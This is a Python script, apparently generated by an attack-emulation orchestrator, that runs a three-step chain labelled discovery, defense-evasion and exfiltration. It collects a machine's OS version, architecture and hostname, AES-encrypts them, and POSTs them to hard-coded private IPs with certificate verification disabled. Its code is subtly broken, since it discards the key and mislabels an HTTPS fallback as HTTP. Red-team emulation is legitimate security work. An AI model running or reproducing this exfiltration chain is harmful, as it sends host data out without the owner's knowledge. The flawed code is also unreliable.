#!/usr/bin/env python3
import sys, json, time, ssl, requests
import platform
from typing import Dict, Any
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Gather system information
        os_version = platform.version()
        architecture = platform.machine()
        hostname = platform.node()

        # Prepare the result dictionary
        result = {
            'os_version': os_version,
            'architecture': architecture,
            'hostname': hostname
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data with None for any missing fields
        result = {
            'os_version': None,
            'architecture': None,
            'hostname': None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def encrypt_data(data: str, key: bytes, iv: bytes) -> bytes:
    """Encrypt the given data using AES encryption."""
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data.encode()) + encryptor.finalize()

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Collect OS information
        os_version = input_data.get('os_version', '')
        architecture = input_data.get('architecture', '')
        hostname = input_data.get('hostname', '')

        # Concatenate the OS information into a single string
        os_info = f"OS Version: {os_version}, Architecture: {architecture}, Hostname: {hostname}"

        # Generate a random key and IV for AES encryption
        key = os.urandom(32)  # AES-256
        iv = os.urandom(16)   # AES block size for CFB mode

        # Encrypt the OS information
        encrypted_data = encrypt_data(os_info, key, iv)

        # Return the encrypted data as a hex string
        result = {'encrypted_data': encrypted_data.hex()}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'encrypted_data': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract encrypted data from input
        encrypted_data = bytes.fromhex(input_data.get('encrypted_data', ''))

        # Define the remote server URL
        server_url = "https://192.168.62.159/api"

        # Create SSL context for secure transmission
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Attempt to send data over HTTPS
        try:
            response = requests.post(server_url, data=encrypted_data, timeout=10, verify=False)
            response.raise_for_status()
            success = True
        except requests.exceptions.RequestException as e:
            # Log warning and fallback to HTTP if HTTPS fails
            print(f"Warning: HTTPS failed, falling back to HTTP. Error: {e}")
            server_url = "https://192.168.178.88/api"
            response = requests.post(server_url, data=encrypted_data, timeout=10)
            response.raise_for_status()
            success = True

        result = {'success': success}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect OS Information [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect OS Information): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect OS Information): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Encrypt OS Information [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Encrypt OS Information): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Encrypt OS Information): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Send Encrypted Data to Remote Server [exfiltration] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Send Encrypted Data to Remote Server): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Send Encrypted Data to Remote Server): FAILED — {err}')
            failed.append('T3')
            r2 = task_T3(outputs.get('T2', {}))
            if r2.get('success'):
                outputs['T3'] = r2.get('data', {})
                failed.remove('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))